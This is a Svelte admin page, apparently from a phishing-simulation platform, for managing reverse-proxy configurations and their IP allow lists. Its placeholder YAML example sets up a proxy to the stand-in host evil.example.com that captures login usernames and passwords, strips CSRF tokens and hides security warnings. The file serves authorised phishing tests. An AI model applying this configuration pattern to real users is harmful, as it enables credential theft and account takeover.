<script>
	import { page } from '$app/stores';
	import { api } from '$lib/api/apiProxy.js';
	import { onMount } from 'svelte';
	import { newTableURLParams } from '$lib/service/tableURLParams.js';
	import { globalButtonDisabledAttributes } from '$lib/utils/form.js';
	import Headline from '$lib/components/Headline.svelte';
	import TextField from '$lib/components/TextField.svelte';
	import TableRow from '$lib/components/table/TableRow.svelte';
	import TableCell from '$lib/components/table/TableCell.svelte';
	import TableUpdateButton from '$lib/components/table/TableUpdateButton.svelte';
	import TableDeleteButton from '$lib/components/table/TableDeleteButton2.svelte';
	import FormError from '$lib/components/FormError.svelte';
	import { addToast } from '$lib/store/toast';
	import { AppStateService } from '$lib/service/appState';
	import TableCellEmpty from '$lib/components/table/TableCellEmpty.svelte';
	import TableCellAction from '$lib/components/table/TableCellAction.svelte';
	import Modal from '$lib/components/Modal.svelte';
	import FormGrid from '$lib/components/FormGrid.svelte';
	import BigButton from '$lib/components/BigButton.svelte';
	import FormFooter from '$lib/components/FormFooter.svelte';
	import Table from '$lib/components/table/Table.svelte';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import { getModalText } from '$lib/utils/common';
	import TableCopyButton from '$lib/components/table/TableCopyButton.svelte';
	import { showIsLoading, hideIsLoading } from '$lib/store/loading.js';
	import TableDropDownEllipsis from '$lib/components/table/TableDropDownEllipsis.svelte';
	import DeleteAlert from '$lib/components/modal/DeleteAlert.svelte';
	import SimpleCodeEditor from '$lib/components/editor/SimpleCodeEditor.svelte';
	import AutoRefresh from '$lib/components/AutoRefresh.svelte';
	import TableCellScope from '$lib/components/table/TableCellScope.svelte';

	// services
	const appStateService = AppStateService.instance;

	// bindings
	let form = null;
	let formValues = {
		id: null,
		name: null,
		description: null,
		startURL: null,
		proxyConfig: null
	};
	let isSubmitting = false;

	// data
	const tableURLParams = newTableURLParams();
	let contextCompanyID = null;
	let proxies = [];
	let proxiesHasNextPage = true;
	let formError = '';
	let isModalVisible = false;
	let isProxyTableLoading = false;
	let modalMode = null;
	let modalText = '';

	let isDeleteAlertVisible = false;
	let deleteValues = {
		id: null,
		name: null
	};

	let isIPAllowListModalVisible = false;
	let ipAllowListEntries = [];
	let selectedProxyForIPList = null;
	let isLoadingIPAllowList = false;

	const currentExample = `version: "0.0"

# optional: forward proxy for outbound requests
# if just ip:port is provided, http:// is automatically prepended
# supported formats:
# proxy: "192.168.1.100:8080"                          # http proxy (ip:port)
# proxy: "http://192.168.1.100:8080"                   # http proxy with scheme
# proxy: "socks5://192.168.1.100:1080"                 # socks5 proxy
# proxy: "socks5://user:pass@192.168.1.100:1080"       # socks5 with auth
# proxy: "http://user:pass@192.168.1.100:8080"         # http with auth

# global TLS configuration (applies to all hosts unless overridden)
global:
  tls:
    mode: "managed"  # "managed" (Let's Encrypt) or "self-signed"

portal.example.com:
  to: "evil.example.com"
  # optional: override global TLS config for this specific host
  # tls:
  #   mode: "self-signed"
  response:
    - path: "^/api/health$"
      headers:
        Content-Type: "application/json"
      body: '{"status": "ok"}'
      forward: true
  capture:
    - name: "credentials"
      method: "POST"
      path: "/login"
      find: "username=([^&]+).*password=([^&]+)"
      from: "request_body"
      required: true
  rewrite:
    # regex-based replacement (default engine)
    - name: "replace_logo"
      find: "logo\\.png"
      replace: "evil-logo.png"
      from: "response_body"
    # dom-based manipulations
    - name: "change_title"
      engine: "dom"
      find: "title"
      action: "setText"
      replace: "Secure Login Portal"
      target: "first"
    - name: "inject_meta"
      engine: "dom"
      find: "head"
      action: "setHtml"
      replace: "<meta name='security' content='enhanced'>"
      target: "first"
    - name: "modify_form_action"
      engine: "dom"
      find: "form[action='/login']"
      action: "setAttr"
      replace: "action:/auth/submit"
      target: "all"
    - name: "add_style_class"
      engine: "dom"
      find: ".login-form"
      action: "addClass"
      replace: "enhanced-security"
      target: "all"
    - name: "remove_csrf_tokens"
      engine: "dom"
      find: "input[name='_token']"
      action: "removeAttr"
      replace: "name"
      target: "all"
    - name: "hide_warnings"
      engine: "dom"
      find: ".security-warning"
      action: "remove"
      target: "all"`;

	$: {
		modalText = getModalText('Proxy', modalMode);
	}

	// hooks
	onMount(() => {
		const context = appStateService.getContext();
		if (context) {
			contextCompanyID = context.companyID;
		}
		refreshProxies();
		tableURLParams.onChange(refreshProxies);
		(async () => {
			const editID = $page.url.searchParams.get('edit');
			if (editID) {
				await openUpdateModal(editID);
			}
		})();
		return () => {
			tableURLParams.unsubscribe();
		};
	});

	// component logic
	const refreshProxies = async (showLoading = true) => {
		try {
			if (showLoading) {
				isProxyTableLoading = true;
			}
			const res = await getProxies();
			proxies = res.rows;
			proxiesHasNextPage = res.hasNextPage;
		} catch (e) {
			addToast('Failed to load Proxies', 'Error');
			console.error('Failed to load Proxies', e);
		} finally {
			if (showLoading) {
				isProxyTableLoading = false;
			}
		}
	};

	const getProxies = async () => {
		try {
			const res = await api.proxy.getAllSubset(tableURLParams, contextCompanyID);
			if (res.success) {
				return res.data;
			}
			throw res.error;
		} catch (e) {
			addToast('Failed to load Proxies', 'Error');
			console.error('failed to get Proxies', e);
		}
		return [];
	};

	/** @param {string} id */
	const getProxy = async (id) => {
		try {
			const res = await api.proxy.getByID(id);
			if (!res.success) {
				throw res.error;
			}
			return res.data;
		} catch (e) {
			addToast('Failed to load Proxy', 'Error');
			console.error('failed to get Proxy', e);
		}
	};

	const onSubmit = async (event) => {
		try {
			isSubmitting = true;
			const saveOnly = event?.detail?.saveOnly || false;
			if (modalMode === 'create' || modalMode === 'copy') {
				await create();
				return;
			} else {
				await update(saveOnly);
				return;
			}
		} finally {
			isSubmitting = false;
		}
	};

	const create = async () => {
		try {
			const proxyData = {
				name: formValues.name,
				description: formValues.description,
				startURL: formValues.startURL,
				proxyConfig: formValues.proxyConfig
			};

			const res = await api.proxy.create({
				...proxyData,
				companyID: contextCompanyID
			});
			if (!res.success) {
				formError = res.error;
				return;
			}
			formError = '';
			addToast('Proxy created', 'Success');
			closeModal();
			refreshProxies();
		} catch (err) {
			addToast('Failed to create Proxy', 'Error');
			console.error('failed to create Proxy:', err);
		}
	};

	const update = async (saveOnly = false) => {
		try {
			const updateData = {
				name: formValues.name,
				description: formValues.description,
				startURL: formValues.startURL,
				proxyConfig: formValues.proxyConfig
			};

			const res = await api.proxy.update(formValues.id, updateData);
			if (!res.success) {
				formError = res.error;
				return;
			}
			formError = '';
			addToast(saveOnly ? 'Proxy saved' : 'Proxy updated', 'Success');
			if (!saveOnly) {
				closeModal();
			}
			refreshProxies();
		} catch (e) {
			addToast(saveOnly ? 'Failed to save Proxy' : 'Failed to update Proxy', 'Error');
			console.error('failed to update Proxy', e);
		}
	};

	/** @param {string} id */
	const onClickDelete = async (id) => {
		const action = api.proxy.delete(id);
		action
			.then((res) => {
				if (res.success) {
					refreshProxies();
					return;
				}
				throw res.error;
			})
			.catch((e) => {
				console.error('failed to delete Proxy:', e);
			});
		return action;
	};

	const openCreateModal = () => {
		modalMode = 'create';
		isModalVisible = true;
	};

	const closeModal = () => {
		isModalVisible = false;
		formValues.name = '';
		formValues.description = '';
		formValues.startURL = '';
		formValues.proxyConfig = '';
		formValues.id = '';
		form.reset();
		formError = '';
	};

	/** @param {string} id */
	const openUpdateModal = async (id) => {
		modalMode = 'update';
		showIsLoading();

		// reset form values first
		formValues = {
			id: null,
			name: null,
			description: null,
			startURL: null,
			proxyConfig: null
		};

		try {
			const proxy = await getProxy(id);
			const r = globalButtonDisabledAttributes(proxy, contextCompanyID);
			if (r.disabled) {
				hideIsLoading();
				return;
			}

			assignProxy(proxy);
			isModalVisible = true;
		} catch (e) {
			addToast('Failed to load Proxy', 'Error');
			console.error('failed to get Proxy', e);
		} finally {
			hideIsLoading();
		}
	};

	const openCopyModal = async (id) => {
		modalMode = 'copy';
		showIsLoading();

		// reset form values first
		formValues = {
			id: null,
			name: null,
			description: null,
			startURL: null,
			proxyConfig: null
		};

		try {
			const proxy = await getProxy(id);
			assignProxy(proxy);
			formValues.id = null; // clear ID for copy
			isModalVisible = true;
		} catch (e) {
			addToast('Failed to load Proxy', 'Error');
			console.error('failed to get Proxy', e);
		} finally {
			hideIsLoading();
		}
	};

	const openDeleteAlert = async (proxyItem) => {
		isDeleteAlertVisible = true;
		deleteValues.id = proxyItem.id;
		deleteValues.name = proxyItem.name;
	};

	const assignProxy = (proxyItem) => {
		formValues.id = proxyItem.id;
		formValues.name = proxyItem.name;
		formValues.description = proxyItem.description;
		formValues.startURL = proxyItem.startURL;
		formValues.proxyConfig = proxyItem.proxyConfig;
	};

	const openIPAllowListModal = async (proxy) => {
		selectedProxyForIPList = proxy;
		isLoadingIPAllowList = true;
		isIPAllowListModalVisible = true;

		console.log('Opening IP allow list for proxy:', proxy.id);

		try {
			const res = await api.ipAllowList.getForProxyConfig(proxy.id);
			console.log('API response:', res);
			if (res.success) {
				ipAllowListEntries = res.data || [];
			} else {
				console.error('API error:', res.error);
				addToast(`Failed to load IP allow list: ${res.error}`, 'Error');
				ipAllowListEntries = [];
			}
		} catch (e) {
			console.error('Network error:', e);
			addToast('Failed to load IP allow list', 'Error');
			ipAllowListEntries = [];
		} finally {
			isLoadingIPAllowList = false;
		}
	};

	const closeIPAllowListModal = () => {
		isIPAllowListModalVisible = false;
		selectedProxyForIPList = null;
		ipAllowListEntries = [];
	};

	const clearIPAllowList = async () => {
		if (!selectedProxyForIPList) return;

		try {
			const res = await api.ipAllowList.clearForProxyConfig(selectedProxyForIPList.id);
			if (res.success) {
				addToast('IP allow list cleared', 'Success');
				ipAllowListEntries = [];
			} else {
				addToast('Failed to clear IP allow list', 'Error');
			}
		} catch (e) {
			addToast('Failed to clear IP allow list', 'Error');
			console.error('failed to clear IP allow list', e);
		}
	};
</script>

<HeadTitle title="Proxies" />
<main>
	<div class="flex justify-between">
		<div class="flex items-center gap-2">
			<Headline>Proxies</Headline>
			<span
				class="bg-orange-100 text-orange-800 text-xs font-medium px-2.5 py-0.5 rounded dark:bg-orange-900 dark:text-orange-300"
				title="This is a beta feature. Use with caution and expect changes"
			>
				BETA
			</span>
		</div>
		<AutoRefresh
			isLoading={false}
			onRefresh={() => {
				refreshProxies(false);
			}}
		/>
	</div>
	<BigButton on:click={openCreateModal}>New Proxy</BigButton>
	<Table
		columns={[
			{ column: 'Name', size: 'large' },
			{ column: 'Start URL', size: 'medium' },
			...(contextCompanyID ? [{ column: 'Scope', size: 'small' }] : [])
		]}
		sortable={['Name', 'Start URL', ...(contextCompanyID ? ['scope'] : [])]}
		hasData={!!proxies.length}
		hasNextPage={proxiesHasNextPage}
		plural="Proxies"
		pagination={tableURLParams}
		isGhost={isProxyTableLoading}
	>
		{#each proxies as proxy}
			<TableRow>
				<TableCell>
					<button
						on:click={() => {
							openUpdateModal(proxy.id);
						}}
						{...globalButtonDisabledAttributes(proxy, contextCompanyID)}
						title={proxy.name}
						class="block w-full py-1 text-left"
					>
						{proxy.name}
					</button>
				</TableCell>

				<TableCell>{proxy.startURL}</TableCell>
				{#if contextCompanyID}
					<TableCellScope companyID={proxy.companyID} />
				{/if}
				<TableCellEmpty />
				<TableCellAction>
					<TableDropDownEllipsis>
						<TableUpdateButton
							on:click={() => openUpdateModal(proxy.id)}
							{...globalButtonDisabledAttributes(proxy, contextCompanyID)}
						/>
						<TableCopyButton title={'Copy'} on:click={() => openCopyModal(proxy.id)} />
						<button
							class="w-full px py-1 text-slate-600 dark:text-gray-200 hover:bg-highlight-blue dark:hover:bg-highlight-blue/50 hover:text-white cursor-pointer text-left transition-colors duration-200"
							on:click={() => openIPAllowListModal(proxy)}
							title="View IP Allow List"
						>
							<p class="ml-2 text-left">View IP Allow List</p>
						</button>
						<TableDeleteButton
							on:click={() => openDeleteAlert(proxy)}
							{...globalButtonDisabledAttributes(proxy, contextCompanyID)}
						></TableDeleteButton>
					</TableDropDownEllipsis>
				</TableCellAction>
			</TableRow>
		{/each}
	</Table>
	<Modal headerText={modalText} visible={isModalVisible} onClose={closeModal} {isSubmitting}>
		<FormGrid on:submit={onSubmit} bind:bindTo={form} {isSubmitting} {modalMode}>
			<div class="col-span-3 w-full overflow-y-auto px-6 py-4 space-y-8">
				<!-- Basic Information Section -->
				<div class="w-full">
					<h3 class="text-base font-medium text-pc-darkblue dark:text-white mb-3">
						Basic Information
					</h3>
					<div class="grid grid-cols-1 md:grid-cols-[1fr_2fr_2fr] gap-4">
						<div>
							<TextField
								required
								minLength={1}
								maxLength={64}
								bind:value={formValues.name}
								placeholder="Company Auth Proxy">Name</TextField
							>
						</div>
						<div>
							<TextField optional maxLength={255} bind:value={formValues.description}
								>Description</TextField
							>
						</div>
						<div class="flex justify-end">
							<TextField
								required
								minLength={3}
								maxLength={255}
								bind:value={formValues.startURL}
								placeholder="https://login.example.com/auth"
								toolTipText="Domain must be in proxy configuration">Start URL</TextField
							>
						</div>
					</div>
				</div>

				<!-- Proxy Configuration Section -->
				<div class="w-full">
					<div class="space-y-6">
						<div class="flex flex-col py-2 w-full">
							<h3 class="text-base font-medium text-pc-darkblue dark:text-white mb-3">
								Proxy Configuration
							</h3>
							<div class="w-80vw">
								<SimpleCodeEditor
									bind:value={formValues.proxyConfig}
									height="large"
									language="yaml"
									placeholder={currentExample}
									enableProxyCompletion={true}
								/>
							</div>
						</div>
					</div>
				</div>

				<FormError message={formError} />
			</div>

			<FormFooter {closeModal} {isSubmitting} />
		</FormGrid>
	</Modal>
	<DeleteAlert
		list={[
			'All associated domains will be deleted',
			'Templates using this Proxy will become unusable',
			'Scheduled or active campaigns using this Proxy will be cancelled'
		]}
		name={deleteValues.name}
		onClick={() => onClickDelete(deleteValues.id)}
		bind:isVisible={isDeleteAlertVisible}
	></DeleteAlert>

	<!-- IP Allow List Modal -->
	<Modal
		headerText={`IP Allow List - ${selectedProxyForIPList?.name || ''}`}
		visible={isIPAllowListModalVisible}
		onClose={closeIPAllowListModal}
		isSubmitting={false}
	>
		<FormGrid>
			<div class="col-span-3 w-full overflow-y-auto px-6 py-4 space-y-6">
				<div class="flex justify-between items-center">
					{#if !isLoadingIPAllowList && ipAllowListEntries && ipAllowListEntries.length > 0}
						<BigButton on:click={clearIPAllowList}>Clear All</BigButton>
					{/if}
				</div>

				{#if isLoadingIPAllowList}
					<div class="flex items-center justify-center py-8">
						<div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
						<span class="ml-2 text-gray-600 dark:text-gray-400">Loading...</span>
					</div>
				{:else if !ipAllowListEntries || ipAllowListEntries.length === 0}
					<div class="text-center py-8 text-gray-500 dark:text-gray-400">
						No IP addresses are allow listed
					</div>
				{:else}
					<Table
						columns={[
							{ column: 'IP Address', size: 'medium' },
							{ column: 'Added At', size: 'medium' },
							{ column: 'Expires At', size: 'medium' }
						]}
						hasData={ipAllowListEntries.length > 0}
						plural="entries"
					>
						{#each ipAllowListEntries as entry}
							<TableRow>
								<TableCell>{entry.ip}</TableCell>
								<TableCell>{new Date(entry.createdAt).toLocaleString()}</TableCell>
								<TableCell>{new Date(entry.expiresAt).toLocaleString()}</TableCell>
								<TableCellEmpty />
								<TableCellEmpty />
							</TableRow>
						{/each}
					</Table>
				{/if}
			</div>
		</FormGrid>
	</Modal>
</main>
